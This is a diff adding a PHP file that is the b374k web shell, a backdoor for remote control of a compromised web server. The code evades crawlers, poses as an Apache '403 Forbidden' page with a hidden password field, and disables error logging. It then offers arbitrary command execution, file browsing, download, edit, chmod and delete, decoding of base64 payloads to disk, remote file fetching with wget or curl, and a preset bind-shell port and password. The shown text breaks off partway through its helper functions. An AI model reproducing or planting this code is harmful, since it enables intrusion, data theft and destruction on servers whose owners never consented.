@@ -1,0 +1,806 @@
+<?php 
+/*********************************************************************************************************/
+$auth_pass = ""; //password crypted with md5, default is 'Newbie3viLc063s'
+/*********************************************************************************************************/
+$color = "#00ff00";
+$default_action = 'FilesMan';
+@define('SELF_PATH', __FILE__);
+
+/*********************************************************************************************************/
+# Avoid google's crawler
+if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { header('HTTP/1.0 404 Not Found'); exit; }
+/*********************************************************************************************************/
+
+@session_start();
+@error_reporting(0);
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@set_time_limit(0);
+@set_magic_quotes_runtime(0);
+@define('VERSION', 'v.2012');
+@define('TITLE', ':: b374k Newbie3viLc063s 2012 ::');
+
+/*********************************************************************************************************/
+
+if( get_magic_quotes_gpc() ) 
+{
+	function stripslashes_array($array) { return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); }
+	$_POST = stripslashes_array($_POST);
+}
+
+function logout()
+{
+	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+	$page = $host='http://'.$_SERVER['SERVER_NAME'].'/'.$_SERVER['PHP_SELF'];
+        echo '<center><span class="b1">The System Is Going To Down For LogOut Administrator Pages!!</scan></center>';
+	?>
+	<script>window.location.href = '<?php print $page; ?>';</script>
+	<?php
+	exit(0);
+}
+
+function myshellexec($command) {
+if (!($p=popen("($command)2>&1","r"))) {
+return 126;
+}
+while (!feof($p)) {
+$line=fgets($p,1000);
+$out .= $line;
+}
+pclose($p);
+return $out;
+}
+
+function parsesort($sort) 
+{ 
+ $one = intval($sort); 
+ $second = substr($sort,-1); 
+ if ($second != "d") {$second = "a";} 
+ return array($one,$second); 
+}
+
+$disablefunc = @ini_get("disable_functions");
+
+function showdisablefunctions() {
+    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:#00FF1E'>".$disablefunc."</span>"; }
+    else { return "<span style='color:#00FF1E'>NONE</span>"; }
+  }
+  
+  function ex($cfe) {
+$res = '';
+if (!empty($cfe)) {
+if(function_exists('exec')) {
+@exec($cfe,$res);
+$res = join("\n",$res);
+} elseif(function_exists('shell_exec')) {
+$res = @shell_exec($cfe);
+} elseif(function_exists('system')) {
+@ob_start();
+@system($cfe);
+$res = @ob_get_contents();
+@ob_end_clean();
+} elseif(function_exists('passthru')) {
+@ob_start();
+@passthru($cfe);
+$res = @ob_get_contents();
+@ob_end_clean();
+} elseif(@is_resource($f = @popen($cfe,"r"))) {
+$res = "";
+while(!@feof($f)) { $res .= @fread($f,1024); }
+@pclose($f);
+} else { $res = "Ex() Disabled!"; }
+}
+return $res;
+}
+
+
+function showstat($stat) {
+if ($stat=="on") { return "<b><font style='color:#00FF00'>ON</font></b>"; }
+else { return "<b><font style='color:#DD4736'>OFF</font></b>"; }
+}
+function testperl() {
+if (ex('perl -h')) { return showstat("on"); }
+else { return showstat("off"); }
+}
+function testfetch() {
+if(ex('fetch --help')) { return showstat("on"); }
+else { return showstat("off"); }
+}
+function testwget() {
+if (ex('wget --help')) { return showstat("on"); }
+else { return showstat("off"); }
+}
+function testoracle() {
+if (function_exists('ocilogon')) { return showstat("on"); }
+else { return showstat("off"); }
+}
+function testpostgresql() {
+if (function_exists('pg_connect')) { return showstat("on"); }
+else { return showstat("off"); }
+}
+function testmssql() {
+if (function_exists('mssql_connect')) { return showstat("on"); }
+else { return showstat("off"); }
+}
+function testcurl() {
+if (function_exists('curl_version')) { return showstat("on"); }
+else { return showstat("off"); }
+}
+function testmysql() {
+if (function_exists('mysql_connect')) { return showstat("on"); }
+else { return showstat("off"); }
+}
+
+$quotes = get_magic_quotes_gpc();
+if ($quotes == "1" or $quotes == "on")
+{
+$quot = "<font style='color:red'>ON</font>";
+}
+else
+{
+$quot = "<font style='color:green'>OFF</font>";
+}
+
+function printLogin() 
+{
+	?>
+<html>
+	<head>
+	<style> input { margin:0;background-color:#fff;border:1px solid #fff; } </style>
+	</head>
+        <title>
+        403 Forbidden
+        </title>
+        <body>
+	<h1>Forbidden</h1>
+	<p>You don't have permission to access this file on this server <?=$_SERVER['HTTP_HOST']?>.</p>
+	<hr>
+	<form method=post>
+	<address>Apache/2.2.8 at <?=$_SERVER['HTTP_HOST']?> Port 80<center><input type=password name=x><input type=submit value=''></center></address>
+	</form>
+	</body>
+</html>
+	<?php
+	exit;
+}
+
+if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
+	{
+	if( empty( $auth_pass ) || ( isset( $_POST['x'] ) && ( md5($_POST['x']) == $auth_pass ) ) )
+		{ $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; }
+	else
+		{ printLogin(); }
+	}
+
+if(isset($_GET['dl']) && ($_GET['dl'] != ""))
+	{ 
+	$file 	= $_GET['dl']; 
+	$filez 	= @file_get_contents($file); 
+	header("Content-type: application/octet-stream"); 
+	header("Content-length: ".strlen($filez)); 
+	header("Content-disposition: attachment; 
+	filename=\"".basename($file)."\";"); 
+	echo $filez; 
+	exit; 
+	} 
+
+elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != ""))
+	{ 
+	$file = $_GET['dlgzip']; 
+	$filez = gzencode(@file_get_contents($file)); 
+	header("Content-Type:application/x-gzip\n"); 
+	header("Content-length: ".strlen($filez)); 
+	header("Content-disposition: attachment; filename=\"".basename($file).".gz\";"); 
+	echo $filez; exit; 
+	} 
+
+if(isset($_GET['img']))
+	{ 
+	@ob_clean(); 
+	$d = magicboom($_GET['y']); 
+	$f = $_GET['img']; 
+	$inf = @getimagesize($d.$f); 
+	$ext = explode($f,"."); 
+	$ext = $ext[count($ext)-1]; 
+	@header("Content-type: ".$inf["mime"]); 
+	@header("Cache-control: public"); 
+	@header("Expires: ".date("r",mktime(0,0,0,1,1,2030))); 
+	@header("Cache-control: max-age=".(60*60*24*7)); 
+	@readfile($d.$f); 
+	exit; 
+	} 
+$ver = VERSION;
+
+$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
+
+if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") $safemode = TRUE; 
+else $safemode 	= FALSE; 
+$system 	= @php_uname(); 
+
+if(strtolower(substr($system,0,3)) == "win") $win = TRUE; 
+else $win 	= FALSE; 
+
+if(isset($_GET['y']))
+	{ if(@is_dir($_GET['view'])){ $pwd = $_GET['view']; @chdir($pwd); } else{ $pwd = $_GET['y']; @chdir($pwd); } } 
+
+if(!$win)
+	{ if(!$user = rapih(exe("whoami"))) $user = ""; if(!$id = rapih(exe("id"))) $id = ""; $prompt = $user." \$ "; $pwd = @getcwd().DIRECTORY_SEPARATOR; } 
+else 
+	{ 
+	$user 	= @get_current_user(); 
+	$id 	= $user; 
+	$prompt = $user." &gt;"; 
+	$pwd 	= realpath(".")."\\"; 
+	$v 	= explode("\\",$d); 
+	$v 	= $v[0]; 
+	foreach (range("A","Z") as $letter) 
+		{ 
+		$bool = @is_dir($letter.":\\"); 
+		if ($bool) 
+			{ 
+			$letters 	.= "<a href=\"?y=".$letter.":\\\">[ "; 
+			if ($letter.":" != $v) {$letters .= $letter;} 
+			else {$letters 	.= "<span class=\"gaya\">".$letter."</span>";} 
+			$letters 	.= " ]</a> "; 
+			} 
+		} 
+	}
+
+if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE; 
+else $posix = FALSE; 
+
+
+        $bytes = disk_free_space("."); 
+        $si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
+        $base = 1024;
+		$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
+        $totalspace_bytes = disk_total_space("."); 
+    	$totalspace_si_prefixs = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
+        $totalspace_bases = 1024;
+		$totalspace_class = min((int)log($totalspace_bytes , $totalspace_bases) , count($totalspace_si_prefixs) - 1);
+        $totalspace_show = sprintf('%1.2f' , $totalspace_bytes / pow($totalspace_bases,$totalspace_class)) . ' ' . $totalspace_si_prefixs[$totalspace_class] . '';
+        $freespace_show = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class] . '';
+	$server_ip 	= @gethostbyname($_SERVER["HTTP_HOST"]); 
+	$my_ip 		= $_SERVER['REMOTE_ADDR']; 
+	$bindport 	= "55555"; 
+	$bindport_pass 	= "Newbie3viLc063s"; 
+	$pwds 		= explode(DIRECTORY_SEPARATOR,$pwd); 
+	$pwdurl 	= ""; 
+	for($i = 0 ; $i < sizeof($pwds)-1 ; $i++)
+		{ 
+		$pathz 	= ""; 
+		for($j 	= 0 ; $j <= $i ; $j++)
+			{ 
+			$pathz .= $pwds[$j].DIRECTORY_SEPARATOR; 
+			} 
+		$pwdurl .= "<a href=\"?y=".$pathz."\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>"; 
+		}
+
+	if(isset($_POST['rename'])){ 
+		$old = $_POST['oldname']; 
+		$new = $_POST['newname']; 
+		@rename($pwd.$old,$pwd.$new); 
+		$file = $pwd.$new; 
+		} 
+	if(isset($_POST['chmod'])){ 
+		$name = $_POST['name']; 
+		$value = $_POST['newvalue']; 
+		if (strlen($value)==3){
+		$value = 0 . "" . $value;
+		}
+		@chmod($pwd.$name,octdec($value)); 
+		$file = $pwd.$name;
+		}
+	if(isset($_POST['chmod_folder'])){ 
+		$name = $_POST['name']; 
+		$value = $_POST['newvalue']; 
+		if (strlen($value)==3){
+		$value = 0 . "" . $value;
+		}
+		@chmod($pwd.$name,octdec($value)); 
+		$file = $pwd.$name;
+		}
+	$buff = $DISP_SERVER_SOFTWARE."<br />"; 
+	$buff .= '<font style="color:#F58F78">'.$system.'</font><br />'; 
+	if($id != "") $buff .= $id."<br />"; 
+	$buff .= "Server IP : "."<span style='color:#FF8800'>$server_ip</span>"."<font> | </font>"."Your IP : "."<span style='color:#FF0000'>$my_ip</span>"."<br />";
+        $buff .= "Total HDD Space : "."<span style='color:#00FF1E'>$totalspace_show</span>"."<font> | </font>"."Free HDD Space : "."<span style='color:#00FF1E'>$freespace_show</span>"."<br />";
+		$buff .=  "Magic Quotes:$quot"."<br>";
+		$buff .= "Disabled Functions: ".showdisablefunctions()."<br>";
+		$buff .= "MySQL: ".testmysql()." MSSQL: ".testmssql()." Oracle: ".testoracle()." MSSQL: ".testmssql()." PostgreSQL: ".testpostgresql()." cURL: ".testcurl()." WGet: ".testwget()." Fetch: ".testfetch()." Perl: ".testperl()."<br>";
+	if($safemode) $buff .= "safemode <span class=\"gaya\">ON</span><br />"; 
+	else $buff .= "safemode <span class=\"gaya\">OFF<span><br />"; 
+	$buff .= $letters."&nbsp;&gt;&nbsp;".$pwdurl; 
+
+	function rapih($text){ return trim(str_replace("<br />","",$text)); } 
+
+	function magicboom($text){ if (!get_magic_quotes_gpc()) { return $text; } return stripslashes($text); } 
+
+	function showdir($pwd,$prompt)
+	{ 
+		$fname = array(); 
+		$dname = array(); 
+		if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE; 
+		else $posix = FALSE; 
+		$user = "????:????"; 
+		if($dh = opendir($pwd))
+			{ 
+			while($file = readdir($dh))
+				{ 
+				if(is_dir($file))
+					{ $dname[] = $file; } 
+				elseif(is_file($file))
+					{ $fname[] = $file; } 
+				} 
+			closedir($dh); 
+			} 
+		sort($fname); 
+		sort($dname); 
+		$path = @explode(DIRECTORY_SEPARATOR,$pwd); 
+		$tree = @sizeof($path); 
+		$parent = ""; 
+		$buff = "<form action=\"?y=".$pwd."&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\"> 
+				<table class=\"cmdbox\" style=\"width:50%;\"> 
+				<tr>
+				<td>CMD@$prompt</td>
+				<td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" />
+				<input class=\"inputzbut\" type=\"submit\" value=\"Execute !\" name=\"submitcmd\" style=\"width:80px;\" /></td>
+				</tr> 
+			</form> 
+			<form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"> 
+				<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
+				<tr>
+				<td>view file/folder</td>
+				<td><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"".$pwd."\" />
+				<input class=\"inputzbut\" type=\"submit\" value=\"Enter !\" name=\"submitcmd\" style=\"width:80px;\" /></td>
+				</tr> 
+			</form>
+			</table>
+			<table class=\"explore\"> 
+				<tr>
+				<th>name</th>
+				<th style=\"width:80px;\">size</th>
+				<th style=\"width:210px;\">owner:group</th>
+				<th style=\"width:80px;\">perms</th>
+				<th style=\"width:110px;\">modified</th>
+				<th style=\"width:190px;\">actions</th>
+				</tr> "; 
+
+		if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR; 
+		else $parent = $pwd; 
+		foreach($dname as $folder)
+			{ 
+			if($folder == ".") 
+				{ 
+				if(!$win && $posix)
+					{ 
+					$name=@posix_getpwuid(@fileowner($folder)); 
+					$group=@posix_getgrgid(@filegroup($folder)); 
+					$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
+					} 
+				else { $owner = $user; } 
+				$buff .= "<tr>
+						<td><a href=\"?y=".$pwd."\">$folder</a></td>
+						<td>-</td>
+						<td style=\"text-align:center;\">".$owner."</td>
+						<td><center>".get_perms($pwd)."</center></td>
+						<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td>
+						<td><span id=\"titik1\">
+							<a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">newfile</a> 
+							| <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a>
+						    </span> 
+						<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
+							<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
+							<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> 
+							<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" /> 
+						</form>
+						</td>
+					</tr> "; 
+				} 
+			elseif($folder == "..") 
+				{ 
+				if(!$win && $posix)
+					{ 
+					$name=@posix_getpwuid(@fileowner($folder)); 
+					$group=@posix_getgrgid(@filegroup($folder)); 
+					$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
+					} 
+				else 	{ $owner = $user; } 
+				$buff .= "<tr>
+						<td>
+						<a href=\"?y=".$parent."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAadEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjEwMPRyoQAAAgZJREFUOE9jYKAF4I7ez6CVfVQvpOOiGcnm8yUdYVRvuWalvvjNTemqi01cUfuJN4Mv/QSjRsdNG81VH6/Lb/vzT6juWhtP/CFGokwQyD3DqNpxy1Zj5YdrCjv+/Zfb+uefSNPNNt6044QNECy5wKjUesNadcHr63Jrv/2XAWL5NV//W819sk9/6sMcMJ4GwXpTHiboTLpvpzXhnoxx/x0WBsHKywzyjdfNlKY9uSU1781/SSQsMef1f4nZr1DxrJcvJWe+XC45/XmIQv8DfgbBqqvScl1374r1Pfwv2gvDD4BsGIaIgeTF+h/9F5vw+I3YxMfrxCY+iQLyBRlEaq+JSjTdWCfRfPOPUMON/zAsDGSLNt38L4aGRZtvvhFrvrVOtOV2FBALMgjVXGMUb7qpIdNxZ51U193fIu13/4OwKBDrdj74bDbzwRNkbDrj/mXj6fdnGk6976/Xd58fHEPA0GaS7LirLdf3YI10/8NfolDviLU8WAQ01E66664tHHffNZftuasq33NPWLXjPgs8ikU77jFL9T3UkZ38ZI3U1Ge/xKc8+wf0Z5tI5z1GoIvQMQNQjEG07S5qEhHve8QsNfmpjvSM52ukZ736JT7pRRvQIMLpANkYoAZm6ZkvtDVmvVktWPK6SmL6K9IMABkmM/slk+qMN7Iy/W/kxKe/ISolk60IAJfcKhfb3kZPAAAAAElFTkSuQmCC' />  $folder</a></td>
+						<td>-</td>
+						<td style=\"text-align:center;\">".$owner."</td>
+						<td><center>".get_perms($parent)."</center></td>
+						<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td>
+						<td><span id=\"titik2\">
+							<a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">newfile</a> 
+							| <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a>
+						    </span> 
+						<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
+							<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
+							<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> 
+							<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" /> 
+						</form> 
+						</td>
+					</tr>"; 
+				} 
+			else 
+				{ 
+				if(!$win && $posix)
+					{ 
+					$name=@posix_getpwuid(@fileowner($folder)); 
+					$group=@posix_getgrgid(@filegroup($folder)); 
+					$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
+					} 
+				else { $owner = $user; } 
+				$buff .= "<tr>
+						<td>
+						<a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAOwgAADsIBFShKgAAAABp0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuMTAw9HKhAAACkUlEQVQ4T8WT2UvUURzFz2NRT5pab9ZDYZNMLjNq6rg1Fqhl5cw8qA+2kJmBgxKUhVpW4y6FZblkaRROpkQLITKG1ERhC5JMuaVmzuQWBD3e27nN0D/QQz/48P1+7znne+/LD/jvn14XtUYXqU+O0kebY2NiLfFxBkuiIcmSnJRiMe5MtexK3W02phjNSYnJZkN8gikmeoeJGRMzRr1OvxZbQzTBZCBUE+oJD4vwcJEnNibOY4hL8HCRJzEh6U/PMzc1d/j2CPc2TaibmSFNiGYT7hT7nbyU579y4dA6WXUsQNacCJR1RYGyoThINpZs8LFe1luD/mi2/ABZedBf2vL8fnSV+JdhohZPJ+sgv16H9NyGXOyGXH4AudLLetfLSh8rZ6Upj/JOMTNRAwfGa9A3Wetb0OlbQPPSffZdXpbZ/11Aj1qgMuPVeIYxG7rGbZAzTZDzHZDfeeOindxjf5M3tkMuMLTEswVqyjNzleEqSGZ74KrEZVcFn1QPMcfN7g4IPlPMN0N8a/IyR9xthJryTDVAuM5Bus6jBaPlKB85xW0XIaYb+bxrkLNXIL5UQxJVxRRfOM0LZnmz8iivyoyWwYaRUhS8LYL4WArxuRJiooq1AuLTGR9nOZd5z5Q2Ro/yqszIaVgxbEXmy8OQbwoh3pdAvrNCvD4KMXwccriAVVFIPR/iQzGhR3lfMMOsCY4chPVb8JPIwVzI5zmQA2aI/
+izO7AezOVNzZEMM5VGnR3nJL0cuInErHcH2DHTb0+DszcSrh1lwPjb7sMD5hKj5kQlOpfXRY0+HszsDPZ0Z2IjcMKyuTsXm5jRob+yBtnUftG0HSBa07QqTt7bu92ote6FtToeWmS1HdFj1zz/zb9ZqmlZ866Y6AAAAAElFTkSuQmCC' />  [ $folder ]</a> 
+						<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
+							<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
+							<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" /> 
+							<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
+							<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
+							onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" />
+						</form> 
+						</td>
+						<td>DIR</td>
+						<td style=\"text-align:center;\">".$owner."</td>
+						<td><center>
+						<a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\">".get_perms($pwd.$folder)."</a>
+							<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form3\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
+							<input type=\"hidden\" name=\"name\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
+							<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($pwd.$folder)), -4)."\" /> 
+							<input class=\"inputzbut\" type=\"submit\" name=\"chmod_folder\" value=\"chmod\" /> 
+							<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
+							onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" />
+					</form>
+					</center></td>
+						<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($folder))."</td>
+						<td><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">rename</a> 
+						| <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">delete</a>
+						</td>
+						</tr>"; 
+				} 
+			} 
+		foreach($fname as $file)
+			{ 
+			$full = $pwd.$file; 
+			if(!$win && $posix)
+				{ 	
+				$name=@posix_getpwuid(@fileowner($file)); 
+				$group=@posix_getgrgid(@filegroup($file)); 
+				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
+				} 
+			else { $owner = $user; } 
+			$buff .= "<tr>
+					<td>
+					<a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAadEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjEwMPRyoQAAAXVJREFUOE+NkjtPwlAYhv0DLEZJSDQawQCTcYD/YWIkzqx0cHT1D7C4nMRFSdOWi4uzm9FFXcRBI3KxQGlLoYCAILyekhiRw6UneZKmeb8n79eepaW/43e5XFGfz0csvF4v8Xi2yfrGJllecRIa2xnLMo+OcDis6kYNulEfUdEMZD/KuH1IQ7y6RiQS0eZJAolkig6U/pHJy0i/vOPm/gnlikYl3ExJMJm6hFxWGQpFhUqyKJQqyNFGHMfptMnu5A5UkBrVZqkiLyt4zcrI5It4y8nY2w9ZkrVxSdBaoVozZ6LqtVGDu8dnHB2fgA4HGYHZaGE2TRj1BoqKhlNyxgriiSRan+2FmM0WYrzACiQq6HS7C2l3uhDjiSkC+vKr17OFNE0gSnH0+9+2sLLMRxRECYPBwBaCOEXACyKGw6EteEFiGgTOYzzsnguapSsExu+B4yB0qJYUlf5rcy5WxsrSYcfkdfavOp3RLbebzMPK0EH/7/APv59j7X+gJNIAAAAASUVORK5CYII%3D' />  $file</a> 
+					<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
+						<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
+						<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" /> 
+						<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
+						<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
+							onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" />
+					</form>
+					</td>
+					<td>".ukuran($full)."</td>
+					<td style=\"text-align:center;\">".$owner."</td>
+					<td><center>
+					<a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\">".get_perms($full)."</a>
+					<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form2\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
+						<input type=\"hidden\" name=\"name\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
+						<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($full)), -4)."\" /> 
+						<input class=\"inputzbut\" type=\"submit\" name=\"chmod\" value=\"chmod\" /> 
+						<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
+							onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\" />
+					</form></center></td>
+					<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($full))."</td> 
+					<td>
+					<a href=\"?y=$pwd&amp;edit=$full\">edit</a> 
+					| <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">rename</a>
+					| <a href=\"?y=$pwd&amp;delete=$full\">delete</a> 
+					| <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gz</a>)
+					</td>
+				</tr>"; 
+			} 
+		$buff .= "</table>"; return $buff; 
+	} 
+
+	function ukuran($file)
+	{ 
+		if($size = @filesize($file))
+			{ 	
+			if($size <= 1024) return $size; 
+			else
+				{ 
+				if($size <= 1024*1024) 
+					{ $size = @round($size / 1024,2);; return "$size kb"; } 
+				else { $size = @round($size / 1024 / 1024,2); return "$size mb"; } 
+				} 
+			} 
+		else return "???"; 
+	} 
+
+	function exe($cmd)
+	{ 
+		if(function_exists('system')) 
+			{ 
+			@ob_start(); 
+			@system($cmd); 
+			$buff = @ob_get_contents();
+			@ob_end_clean(); 
+			return $buff; 
+			} 
+		elseif(function_exists('exec')) 
+			{ 
+			@exec($cmd,$results); 
+			$buff = ""; 
+			foreach($results as $result)
+				{ $buff .= $result; } 
+			return $buff; 
+			} 
+		elseif(function_exists('passthru')) 
+			{ 
+			@ob_start(); 
+			@passthru($cmd); 
+			$buff = @ob_get_contents(); 
+			@ob_end_clean(); 
+			return $buff; 
+			} 
+		elseif(function_exists('shell_exec'))
+			{ 
+			$buff = @shell_exec($cmd); 
+			return $buff; 
+			} 
+	} 
+
+	function tulis($file,$text)
+	{ 
+	$textz = gzinflate(base64_decode($text)); 
+	if($filez = @fopen($file,"w")) 
+		{ 
+		@fputs($filez,$textz); 
+		@fclose($file); 
+		} 
+	} 
+	
+	function tulis_2($file,$text)
+	{ 
+	$textz = base64_decode($text); 
+	if($filez = @fopen($file,"w")) 
+		{ 
+		@fputs($filez,$textz); 
+		@fclose($file); 
+		} 
+	} 
+
+	function ambil($link,$file) 
+	{ 
+	if($fp = @fopen($link,"r"))
+		{ 
+		while(!feof($fp)) 
+			{ 
+			$cont.= @fread($fp,1024); 
+			} 
+		@fclose($fp); 
+		$fp2 = @fopen($file,"w"); 
+		@fwrite($fp2,$cont); 
+		@fclose($fp2); 
+		} 
+	} 
+
+	function which($pr)
+	{ 
+	$path = exe("which $pr"); 
+	if(!empty($path)) 
+		{ return trim($path); } 
+	else { return trim($pr); } 
+	} 
+
+	function download($cmd,$url)
+	{ 
+	$namafile = basename($url); 
+	switch($cmd) 
+		{ 
+		case 'wwget': exe(which('wget')." ".$url." -O ".$namafile); break; 
+		case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile); break; 
+		case 'wfread' : ambil($wurl,$namafile);break; 
+		case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break; 
+		case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break; 
+		case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break; 
+		case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break; 
+		default: break; } 
+	return $namafile; 
+	} 
+
+	function get_perms($file) 
+	{ 
+		if($mode=@fileperms($file))
+			{ 
+			$perms=''; 
+			$perms .= ($mode & 00400) ? 'r' : '-'; 
+			$perms .= ($mode & 00200) ? 'w' : '-'; 
+			$perms .= ($mode & 00100) ? 'x' : '-'; 
+			$perms .= ($mode & 00040) ? 'r' : '-'; 
+			$perms .= ($mode & 00020) ? 'w' : '-'; 
+			$perms .= ($mode & 00010) ? 'x' : '-'; 
+			$perms .= ($mode & 00004) ? 'r' : '-'; 
+			$perms .= ($mode & 00002) ? 'w' : '-'; 
+			$perms .= ($mode & 00001) ? 'x' : '-'; 
+			return $perms; 
+			} 
+		else return "??????????"; 
+	} 
+
+	function clearspace($text){ return str_replace(" ","_",$text); } 
+
